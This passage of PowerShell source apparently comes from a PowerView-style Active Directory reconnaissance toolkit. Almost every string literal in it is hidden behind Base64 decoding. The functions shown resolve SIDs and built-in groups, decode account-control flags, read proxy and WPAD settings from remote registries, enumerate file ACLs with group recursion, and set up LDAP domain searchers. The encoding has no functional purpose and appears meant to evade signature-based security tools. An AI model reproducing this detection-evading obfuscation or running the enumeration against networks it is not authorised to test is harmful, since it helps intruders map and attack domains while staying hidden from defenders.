                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU1")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxSZW1vdGUgRGVza3RvcCBVc2Vycw=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU2")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxOZXR3b3JrIENvbmZpZ3VyYXRpb24gT3BlcmF0b3Jz"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU3")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxJbmNvbWluZyBGb3Jlc3QgVHJ1c3QgQnVpbGRlcnM="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU4")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxQZXJmb3JtYW5jZSBNb25pdG9yIFVzZXJz"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU5")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxQZXJmb3JtYW5jZSBMb2cgVXNlcnM="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTYw")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxXaW5kb3dzIEF1dGhvcml6YXRpb24gQWNjZXNzIEdyb3Vw"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTYx")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxUZXJtaW5hbCBTZXJ2ZXIgTGljZW5zZSBTZXJ2ZXJz"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTYy")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxEaXN0cmlidXRlZCBDT00gVXNlcnM="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTY5")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxDcnlwdG9ncmFwaGljIE9wZXJhdG9ycw=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTcz")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxFdmVudCBMb2cgUmVhZGVycw=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc0")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxDZXJ0aWZpY2F0ZSBTZXJ2aWNlIERDT00gQWNjZXNz"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc1")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxSRFMgUmVtb3RlIEFjY2VzcyBTZXJ2ZXJz"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc2")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxSRFMgRW5kcG9pbnQgU2VydmVycw=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc3")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxSRFMgTWFuYWdlbWVudCBTZXJ2ZXJz"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc4")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxIeXBlci1WIEFkbWluaXN0cmF0b3Jz"))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc5")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxBY2Nlc3MgQ29udHJvbCBBc3Npc3RhbmNlIE9wZXJhdG9ycw=="))) }
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTgw")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxBY2Nlc3MgQ29udHJvbCBBc3Npc3RhbmNlIE9wZXJhdG9ycw=="))) }
                Default { 
                    $Obj = (New-Object System.Security.Principal.SecurityIdentifier($SID2))
                    $Obj.Translate( [System.Security.Principal.NTAccount]).Value
                }
            }
        }
        catch {
            
            $SID
        }
    }
}


function Convert-NT4toCanonical {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $ObjectName
    )

    process {

        $ObjectName = $ObjectName -replace "/","\"
        
        if($ObjectName.contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))) {
            
            $Domain = $ObjectName.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[0]
        }

        
        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
            $Output = $Object.GetType().InvokeMember($Method, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW52b2tlTWV0aG9k"))), $Null, $Object, $Parameters)
            if ( $Output ) { $Output }
        }
        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {
            [Void] $Object.GetType().InvokeMember($Property, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0UHJvcGVydHk="))), $Null, $Object, $Parameters)
        }

        $Translate = New-Object -ComObject NameTranslate

        try {
            Invoke-Method $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5pdA=="))) (1, $Domain)
        }
        catch [System.Management.Automation.MethodInvocationException] { 
            Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3Igd2l0aCB0cmFuc2xhdGUgaW5pdCBpbiBDb252ZXJ0LU5UNHRvQ2Fub25pY2FsOiB7MH0="))) -f $_)
        }

        Set-Property $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hhc2VSZWZlcnJhbA=="))) (0x60)

        try {
            Invoke-Method $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0"))) (3, $ObjectName)
            (Invoke-Method $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0"))) (2))
        }
        catch [System.Management.Automation.MethodInvocationException] {
            Write-Debug (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3Igd2l0aCB0cmFuc2xhdGUgU2V0L0dldCBpbiBDb252ZXJ0LU5UNHRvQ2Fub25pY2FsOiB7MH0="))) -f $_)
        }
    }
}


function Convert-CanonicaltoNT4 {


    [CmdletBinding()]
    param(
        [String] $ObjectName
    )

    $Domain = ($ObjectName -split ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QA=="))))[1]

    $ObjectName = $ObjectName -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))

    
    function Invoke-Method([__ComObject] $object, [String] $method, $parameters) {
        $output = $object.GetType().InvokeMember($method, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW52b2tlTWV0aG9k"))), $NULL, $object, $parameters)
        if ( $output ) { $output }
    }
    function Set-Property([__ComObject] $object, [String] $property, $parameters) {
        [Void] $object.GetType().InvokeMember($property, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0UHJvcGVydHk="))), $NULL, $object, $parameters)
    }

    $Translate = New-Object -comobject NameTranslate

    try {
        Invoke-Method $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5pdA=="))) (1, $Domain)
    }
    catch [System.Management.Automation.MethodInvocationException] { }

    Set-Property $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hhc2VSZWZlcnJhbA=="))) (0x60)

    try {
        Invoke-Method $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0"))) (5, $ObjectName)
        (Invoke-Method $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0"))) (3))
    }
    catch [System.Management.Automation.MethodInvocationException] { $_ }
}


function ConvertFrom-UACValue {

    
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        $Value,

        [Switch]
        $ShowAll
    )

    begin {

        
        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U0NSSVBU"))), 1)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QUNDT1VOVERJU0FCTEU="))), 2)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SE9NRURJUl9SRVFVSVJFRA=="))), 8)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TE9DS09VVA=="))), 16)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UEFTU1dEX05PVFJFUUQ="))), 32)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UEFTU1dEX0NBTlRfQ0hBTkdF"))), 64)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RU5DUllQVEVEX1RFWFRfUFdEX0FMTE9XRUQ="))), 128)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VEVNUF9EVVBMSUNBVEVfQUNDT1VOVA=="))), 256)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9STUFMX0FDQ09VTlQ="))), 512)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SU5URVJET01BSU5fVFJVU1RfQUNDT1VOVA=="))), 2048)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V09SS1NUQVRJT05fVFJVU1RfQUNDT1VOVA=="))), 4096)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U0VSVkVSX1RSVVNUX0FDQ09VTlQ="))), 8192)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RE9OVF9FWFBJUkVfUEFTU1dPUkQ="))), 65536)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TU5TX0xPR09OX0FDQ09VTlQ="))), 131072)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U01BUlRDQVJEX1JFUVVJUkVE"))), 262144)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFJVU1RFRF9GT1JfREVMRUdBVElPTg=="))), 524288)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9UX0RFTEVHQVRFRA=="))), 1048576)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVNFX0RFU19LRVlfT05MWQ=="))), 2097152)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RE9OVF9SRVFfUFJFQVVUSA=="))), 4194304)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UEFTU1dPUkRfRVhQSVJFRA=="))), 8388608)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFJVU1RFRF9UT19BVVRIX0ZPUl9ERUxFR0FUSU9O"))), 16777216)
        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UEFSVElBTF9TRUNSRVRTX0FDQ09VTlQ="))), 67108864)

    }

    process {

        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary

        if($Value -is [Int]) {
            $IntValue = $Value
        }

        if ($Value -is [PSCustomObject]) {
            if($Value.useraccountcontrol) {
                $IntValue = $Value.useraccountcontrol
            }
        }

        if($IntValue) {

            if($ShowAll) {
                foreach ($UACValue in $UACValues.GetEnumerator()) {
                    if( ($IntValue -band $UACValue.Value) -eq $UACValue.Value) {
                        $ResultUACValues.Add($UACValue.Name, (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9Kw=="))) -f $($UACValue.Value)))
                    }
                    else {
                        $ResultUACValues.Add($UACValue.Name, (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9"))) -f $($UACValue.Value)))
                    }
                }
            }
            else {
                foreach ($UACValue in $UACValues.GetEnumerator()) {
                    if( ($IntValue -band $UACValue.Value) -eq $UACValue.Value) {
                        $ResultUACValues.Add($UACValue.Name, (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ezB9"))) -f $($UACValue.Value)))
                    }
                }                
            }
        }

        $ResultUACValues
    }
}


function Get-Proxy {

    param(
        [Parameter(ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $ENV:COMPUTERNAME
    )

    process {
        try {
            $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3VycmVudFVzZXI="))), $ComputerName)
            $RegKey = $Reg.OpenSubkey(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXEludGVybmV0IFNldHRpbmdz"))))
            $ProxyServer = $RegKey.GetValue(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJveHlTZXJ2ZXI="))))
            $AutoConfigURL = $RegKey.GetValue(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXV0b0NvbmZpZ1VSTA=="))))

            if($AutoConfigURL -and ($AutoConfigURL -ne "")) {
                try {
                    $Wpad = (New-Object Net.Webclient).DownloadString($AutoConfigURL)
                }
                catch {
                    $Wpad = ""
                }
            }
            else {
                $Wpad = ""
            }
            
            if($ProxyServer -or $AutoConfigUrl) {

                $Properties = @{
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJveHlTZXJ2ZXI="))) = $ProxyServer
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXV0b0NvbmZpZ1VSTA=="))) = $AutoConfigURL
                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3BhZA=="))) = $Wpad
                }
                
                New-Object -TypeName PSObject -Property $Properties
            }
            else {
                Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm8gcHJveHkgc2V0dGluZ3MgZm91bmQgZm9yICRDb21wdXRlck5hbWU=")))
            }
        }
        catch {
            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3IgZW51bWVyYXRpbmcgcHJveHkgc2V0dGluZ3MgZm9yICRDb21wdXRlck5hbWU=")))
        }
    }
}


function Get-PathAcl {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [string]
        $Path,

        [Switch]
        $Recurse
    )

    begin {

        function Convert-FileRight {

            

            [CmdletBinding()]
            param(
                [Int]
                $FSR
            )

            $AccessMask = @{
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg4MDAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY1JlYWQ=")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg0MDAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY1dyaXRl")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgyMDAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY0V4ZWN1dGU=")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgxMDAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY0FsbA==")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMjAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWF4aW11bUFsbG93ZWQ=")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMTAwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNjZXNzU3lzdGVtU2VjdXJpdHk=")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDEwMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3luY2hyb25pemU=")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDA4MDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVPd25lcg==")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDA0MDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVEQUM=")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAyMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZENvbnRyb2w=")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAxMDAwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsZXRl")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDEwMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVBdHRyaWJ1dGVz")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDA4MA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZEF0dHJpYnV0ZXM=")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDA0MA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVsZXRlQ2hpbGQ=")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAyMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXhlY3V0ZS9UcmF2ZXJzZQ==")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAxMA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVFeHRlbmRlZEF0dHJpYnV0ZXM=")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwOA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZEV4dGVuZGVkQXR0cmlidXRlcw==")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwNA=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXBwZW5kRGF0YS9BZGRTdWJkaXJlY3Rvcnk=")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwMg=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGVEYXRhL0FkZEZpbGU=")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAwMDAwMQ=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZERhdGEvTGlzdERpcmVjdG9yeQ==")))
            }

            $SimplePermissions = @{
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgxZjAxZmY="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RnVsbENvbnRyb2w=")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMzAxYmY="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TW9kaWZ5")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMjAwYTk="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZEFuZEV4ZWN1dGU=")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMjAxOWY="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZEFuZFdyaXRl")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMjAwODk="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVhZA==")))
              [uint32]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHgwMDAxMTY="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3JpdGU=")))
            }

            $Permissions = @()

            
            $Permissions += $SimplePermissions.Keys |  % {
                              if (($FSR -band $_) -eq $_) {
                                $SimplePermissions[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }

            
            $Permissions += $AccessMask.Keys |
                            ? { $FSR -band $_ } |
                            % { $AccessMask[$_] }

            ($Permissions | ?{$_}) -join ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA==")))
        }
    }

    process {

        try {
            $ACL = Get-Acl -Path $Path

            $ACL.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | ForEach-Object {

                $Names = @()
                if ($_.IdentityReference -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS01LTIxLVswLTldKy1bMC05XSstWzAtOV0rLVswLTldKw==")))) {
                    $Object = Get-ADObject -SID $_.IdentityReference
                    $Names = @()
                    $SIDs = @($Object.objectsid)

                    if ($Recurse -and ($Object.samAccountType -ne ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ODA1MzA2MzY4"))))) {
                        $SIDs += Get-NetGroupMember -SID $Object.objectsid | Select-Object -ExpandProperty MemberSid
                    }

                    $SIDs | ForEach-Object {
                        $Names += ,@($_, (Convert-SidToName $_))
                    }
                }
                else {
                    $Names += ,@($_.IdentityReference.Value, (Convert-SidToName $_.IdentityReference.Value))
                }

                ForEach($Name in $Names) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA=="))) $Path
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmlsZVN5c3RlbVJpZ2h0cw=="))) (Convert-FileRight -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2U="))) $Name[1]
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlTSUQ="))) $Name[0]
                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNjZXNzQ29udHJvbFR5cGU="))) $_.AccessControlType
                    $Out
                }
            }
        }
        catch {
            Write-Warning $_
        }
    }
}


function Get-NameField {
    
    
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        $Object
    )
    process {
        if($Object) {
            if ( [bool]($Object.PSobject.Properties.name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZG5zaG9zdG5hbWU=")))) ) {
                
                $Object.dnshostname
            }
            elseif ( [bool]($Object.PSobject.Properties.name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bmFtZQ==")))) ) {
                
                $Object.name
            }
            else {
                
                $Object
            }
        }
        else {
            return $Null
        }
    }
}


function Convert-LDAPProperty {
    
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if (($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0c2lk")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2lkaGlzdG9yeQ=="))))) {
            
            $ObjectProperties[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value
        }
        elseif($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0Z3VpZA==")))) {
            
            $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
        }
        elseif( ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bGFzdGxvZ29u")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bGFzdGxvZ29udGltZXN0YW1w")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cHdkbGFzdHNldA==")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bGFzdGxvZ29mZg==")))) -or ($_ -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YmFkUGFzc3dvcmRUaW1l")))) ) {
            
            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                
                $Temp = $Properties[$_][0]
                [Int32]$High = $Temp.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SGlnaFBhcnQ="))), [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG93UGFydA=="))),  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64](([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHh7MDp4OH17MTp4OH0="))) -f $High, $Low)))
            }
            else {
                $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
            }
        }
        elseif($Properties[$_][0] -is [System.MarshalByRefObject]) {
            
            $Prop = $Properties[$_]
            try {
                $Temp = $Prop[$_][0]
                Write-Verbose $_
                [Int32]$High = $Temp.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SGlnaFBhcnQ="))), [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG93UGFydA=="))),  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = [Int64](([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHh7MDp4OH17MTp4OH0="))) -f $High, $Low)
            }
            catch {
                $ObjectProperties[$_] = $Prop[$_]
            }
        }
        elseif($Properties[$_].count -eq 1) {
            $ObjectProperties[$_] = $Properties[$_][0]
        }
        else {
            $ObjectProperties[$_] = $Properties[$_]
        }
    }

    New-Object -TypeName PSObject -Property $ObjectProperties
}









function Get-DomainSearcher {


    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    if(!$Domain) {
        $Domain = (Get-NetDomain).name
    }
    else {
        if(!$DomainController) {
            try {
                
                
                $DomainController = ((Get-NetDomain).PdcRoleOwner).Name
            }
            catch {
                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0LURvbWFpblNlYXJjaGVyOiBFcnJvciBpbiByZXRyaWV2aW5nIFBEQyBmb3IgY3VycmVudCBkb21haW4=")))
            }
        }
    }

    $SearchString = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUDovLw==")))

    if($DomainController) {
        $SearchString += $DomainController + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw==")))
    }
    if($ADSprefix) {
        $SearchString += $ADSprefix + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA==")))
    }

    if($ADSpath) {
        if($ADSpath -like ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R0M6Ly8q")))) {
            
            $DistinguishedName = $AdsPath
